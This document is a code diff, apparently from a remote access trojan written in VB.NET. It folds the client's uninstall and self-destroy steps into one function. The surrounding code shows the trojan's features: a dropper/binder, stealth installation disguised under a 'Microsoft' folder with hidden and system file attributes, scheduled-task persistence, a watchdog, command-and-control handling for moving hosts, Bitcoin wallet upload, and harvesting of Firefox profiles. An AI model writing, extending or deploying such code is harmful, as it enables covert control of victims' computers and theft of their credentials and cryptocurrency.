@@ -70,9 +70,7 @@ Public Class Form1
 
             If checkBlacklist() = True Then
                 C.Send("Uninstall")
-                DStartup(StartName)
-                SelfDestroy()
-                Application.Exit()
+                Uninstall(True, False)
             End If
 
             If ElevateUAC = "True" Then
@@ -119,9 +117,7 @@ Public Class Form1
 
             If BinderStatus = "True" Then
                 Dim Binder As New BinderService
-                If File.Exists(Environ(DropperPath) & DropperName) Then
-
-                Else
+                If Not File.Exists(Environ(DropperPath) & DropperName) Then
                     With Binder
                         .BinderBytes = BinderBytes
                         .DropperName = DropperName
@@ -165,23 +161,24 @@ Public Class Form1
             End If
 
             If HardInstall = "True" Then
-                Call Install_Server()
+                Dim StealthMode As New Stealth_Mode(Environ(PathS) & "\Microsoft\MyClient\", InstallName, StartName)
+                StealthMode.Install_Server()
+
                 If Application.ExecutablePath = Environ(PathS) & "\Microsoft\MyClient\" & InstallName Then
                     C.Send("Online")
                 Else
                     Process.Start(Environ(PathS) & "\Microsoft\MyClient\" & InstallName)
+                    File.SetAttributes(Application.ExecutablePath, FileAttributes.Hidden + FileAttributes.System)
                     Application.Exit()
-                    Try
-                        File.SetAttributes(Application.ExecutablePath, FileAttributes.Hidden + FileAttributes.System)
-                    Catch ex As Exception
-
-                    End Try
-                    End
                 End If
             End If
 
             If ASchtask = "True" Then
-                AddtoSchTask()
+                Dim SchTask As New SchTask
+                SchTask.PATHS = PathS
+                SchTask.InstallName = InstallName
+                SchTask.HardInstall = HardInstall
+                SchTask.AddtoSchTask()
             End If
 
             If WatcherStatus = "True" Then
@@ -425,15 +422,7 @@ Public Class Form1
                         Try
                             C.Send("Uninstall")
                             C.Log("Succ", "Client has been removed")
-                            If Startup = "True" Then
-                                DStartup(StartName)
-                            End If
-                            If WatcherStatus = "True" Then
-                                Watchdog.KeepRunning = False
-                                Watchdog.StopWatcher(True)
-                            End If
-                            SelfDestroy()
-                            Application.Exit()
+                            Uninstall(True, False)
                         Catch ex As Exception
                             C.Log("Fail", "An unexpected error occurred " & ex.Message)
                         End Try
@@ -465,11 +454,7 @@ Public Class Form1
                             C.Send("CleanCommands")
                             C.Log("Succ", "Connection closed")
                             C.Send("Offline")
-                            If WatcherStatus = "True" Then
-                                Watchdog.KeepRunning = False
-                                Watchdog.StopWatcher(False)
-                            End If
-                            Application.Exit()
+                            Uninstall(False, False)
                         Catch ex As Exception
                             C.Log("Fail", "An unexpected error occurred " & ex.Message)
                         End Try
@@ -523,16 +508,9 @@ Public Class Form1
                             My.Settings.moveStatus = True
                             My.Settings.newHost = A(1)
                             My.Settings.Save()
-                            If (Startup = "True") Then
-                                DStartup(StartName)
-                            End If
-                            If WatcherStatus = "True" Then
-                                Watchdog.KeepRunning = False
-                                Watchdog.StopWatcher(True)
-                            End If
                             C.Log("Succ", "Client has been moved to the new host")
                             C.Send("Uninstall")
-                            Application.Restart()
+                            Uninstall(False, True)
                         Catch ex As Exception
                             C.Log("Fail", "An unexpected error occurred " & ex.Message)
                         End Try
@@ -542,16 +520,9 @@ Public Class Form1
                         Try
                             My.Settings.blacklist = True
                             My.Settings.Save()
-                            If (Startup = "True") Then
-                                DStartup(StartName)
-                            End If
-                            If WatcherStatus = "True" Then
-                                Watchdog.KeepRunning = False
-                                Watchdog.StopWatcher(True)
-                            End If
                             C.Send("Uninstall")
                             C.Log("Succ", "Client has been blacklisted")
-                            Application.Exit()
+                            Uninstall(True, False)
                         Catch ex As Exception
                             C.Log("Fail", "An unexpected error occurred " & ex.Message)
                         End Try
@@ -593,7 +564,7 @@ Public Class Form1
                                 C.Log("Succ", "Bitcoin Wallet has been uploaded")
                             Else
                                 C.Send("CleanCommands")
-
+                                C.Log("Fail", "System did not find a .dat wallet")
                             End If
                         Catch ex As Exception
                             C.Log("Fail", "An unexpected error occurred " & ex.Message)
@@ -698,7 +669,7 @@ Public Class Form1
         Try
 
             Dim profiles_path As String = Environ("Appdata") & "\Mozilla\Firefox\Profiles"
-            Dim directories As String() = Directory.GetDirectories(Environ("Appdata") + "\Mozilla\Firefox\Profiles")
+            Dim directories As String() = Directory.GetDirectories(Environ("Appdata") & "\Mozilla\Firefox\Profiles")
 
             For Each dir As String In directories
 
@@ -786,13 +757,29 @@ Public Class Form1
             C.Log("Succ", "Client has been updated")
             AStartup(getMD5Hash(File.ReadAllBytes(TempPath & "\updatedpayload.exe")), TempPath & "\updatedpayload.exe")
             Process.Start(TempPath & "\updatedpayload.exe")
-            SelfDestroy()
-            Application.Exit()
+            Uninstall(True, False)
             Return True
         Catch ex As Exception
             C.Log("Fail", "An unexpected error occurred " & ex.Message)
             Return False
         End Try
+    End Function
+    Public Function Uninstall(ByVal RunSelfDestroy As Boolean, ByVal RestartMe As Boolean)
+        If (Startup = "True") Then
+            DStartup(StartName)
+        End If
+        If WatcherStatus = "True" Then
+            Watchdog.KeepRunning = False
+            Watchdog.StopWatcher(True)
+        End If
+        If RunSelfDestroy = True Then
+            SelfDestroy()
+        End If
+        If RestartMe = True Then
+            Application.Restart()
+        Else
+            Application.Exit()
+        End If
     End Function
     Public Function getMD5Hash(ByVal B As Byte()) As String
         B = New MD5CryptoServiceProvider().ComputeHash(B)
